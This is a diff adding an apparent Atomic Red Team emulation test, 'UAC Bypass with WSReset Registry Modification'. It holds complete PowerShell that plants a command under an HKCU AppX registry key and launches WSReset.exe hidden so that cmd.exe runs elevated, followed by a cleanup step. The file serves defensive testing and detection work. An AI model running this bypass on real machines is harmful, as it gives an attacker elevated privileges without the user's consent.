@@ -616,3 +616,30 @@ atomic_tests:
       Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
     name: powershell
     elevation_required: true
+- name: UAC Bypass with WSReset Registry Modification
+  description: |
+    The following UAC bypass is focused on a registry key under "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" that will trigger a command once wsreset.exe runs. 
+    This bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.
+    If successful, the command to run will spawn off wsreset.exe. 
+    [UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    commandpath:
+      description: Registry path
+      type: String
+      default: 'HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command'
+    commandtorun:
+      description: Command to run
+      type: String
+      default: 'C:\Windows\System32\cmd.exe /c start cmd.exe'
+  executor:
+    command: |-
+      New-Item #{commandpath} -Force | Out-Null
+      New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null
+      Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null
+      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
+    cleanup_command: |
+      Remove-Item #{commandpath} -Recurse -Force
+    name: powershell
+    elevation_required: true
